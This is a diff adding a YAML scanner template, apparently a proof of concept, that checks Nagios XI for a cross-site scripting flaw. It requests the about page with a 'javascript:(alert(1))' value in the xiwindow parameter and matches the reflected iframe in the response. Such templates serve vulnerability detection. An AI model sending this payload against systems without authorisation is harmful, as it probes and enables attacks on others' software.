@@ -1,0 +1,21 @@
+id: poc-yaml-nagiosxi-xss
+info:
+  name: Nagios XI 存储型跨站脚本漏洞
+  severity: high
+  tags:
+  - xss
+  finger: Nagios
+  osprey-id: vb_2019_0021
+variables:
+  r_path: 'str("/nagiosxi/about/index.php?xiwindow=a:javascript:(alert(1))//")
+
+    str("/about/index.php?xiwindow=a:javascript:(alert(1))//")'
+requests:
+- method: GET
+  path: '{{.r_path}}'
+  headers: {}
+  expression: 'contains(body, "<iframe src=\"javascript:(alert(1))//") && contains(body,
+    "Nagios")
+
+    '
+transport: http
